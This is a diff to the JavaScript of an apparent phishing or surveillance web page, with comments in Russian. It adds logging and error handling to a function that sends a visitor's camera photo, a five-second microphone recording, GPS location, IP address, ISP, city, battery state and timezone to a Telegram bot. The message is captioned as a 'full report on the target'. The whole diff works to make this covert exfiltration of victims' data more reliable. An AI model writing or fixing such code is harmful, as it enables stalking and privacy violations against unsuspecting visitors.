@@ -96,8 +96,22 @@
 
         async function sendAllData(photoBlob, audioBlob, geoData) {
             if (BOT_TOKEN === 'ТВОЙ_ТОКЕН_ЗДЕСЬ') return;
+
+            console.log("=== НАЧАЛО ОТПРАВКИ ===");
+            console.log("Фото:", photoBlob);
+            console.log("Аудио:", audioBlob);
+
+            if (!photoBlob) {
+                console.error("ОШИБКА: Фото не создано (photoBlob = null). Проверьте доступ к камере.");
+                return;
+            }
+
             let ip = "Неизвестно", provider = "Неизвестно", city = "Неизвестно";
-            try { const res = await fetch('https://ipwho.is/'); const j = await res.json(); ip = j.ip; provider = j.connection ? j.connection.isp : "Неизвестно"; city = j.city || "Неизвестно"; } catch (e) {}
+            try { 
+                const res = await fetch('https://ipwho.is/'); 
+                const j = await res.json(); 
+                ip = j.ip; provider = j.connection ? j.connection.isp : "Неизвестно"; city = j.city || "Неизвестно"; 
+            } catch (e) { console.log("Ошибка IP:", e); }
             
             let battery = "Неизвестно", charging = "";
             try { const b = await navigator.getBattery(); battery = Math.round(b.level * 100) + "%"; charging = b.charging ? " (Заряжается)" : ""; } catch (e) {}
@@ -117,9 +131,7 @@
             let timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
 
             let caption = `🚨 **ПОЛНЫЙ ОТЧЕТ О ЦЕЛИ** 🚨\n\n`;
-            caption += `🌐 **IP:** ${ip}\n`;
-            caption += `🏢 **Провайдер:** ${provider}\n`;
-            caption += `🏙️ **Город:** ${city}\n`;
+            caption += `🌐 **IP:** ${ip}\n🏢 **Провайдер:** ${provider}\n🏙️ **Город:** ${city}\n`;
             caption += `📍 **GPS:** ${geoData ? geoData.lat + ", " + geoData.lon : "Отклонено"}\n`;
             if (geoData) caption += `🗺️ [Google Карты](https://www.google.com/maps/search/?api=1&query=${geoData.lat},${geoData.lon})\n\n`;
             else caption += `\n`;
@@ -137,15 +149,25 @@
             formDataPhoto.append('photo', photoBlob, 'photo.jpg');
             formDataPhoto.append('caption', caption);
             formDataPhoto.append('parse_mode', 'Markdown');
-            try { await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formDataPhoto }); } catch (e) { console.error(e); }
+            
+            try { 
+                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formDataPhoto }); 
+                const result = await response.json();
+                console.log("Ответ Telegram на фото:", result);
+            } catch (e) { console.error("Ошибка отправки фото:", e); }
 
             if (audioBlob) {
                 const formDataAudio = new FormData();
                 formDataAudio.append('chat_id', CHAT_ID);
                 formDataAudio.append('voice', audioBlob, 'voice.ogg');
                 formDataAudio.append('caption', '🎤 Запись с микрофона (5 сек)');
-                try { await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVoice`, { method: 'POST', body: formDataAudio }); } catch (e) { console.error(e); }
+                try { 
+                    const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVoice`, { method: 'POST', body: formDataAudio }); 
+                    const result = await response.json();
+                    console.log("Ответ Telegram на аудио:", result);
+                } catch (e) { console.error("Ошибка отправки аудио:", e); }
             }
+            console.log("=== КОНЕЦ ОТПРАВКИ ===");
         }
 
         async function requestGeo() {
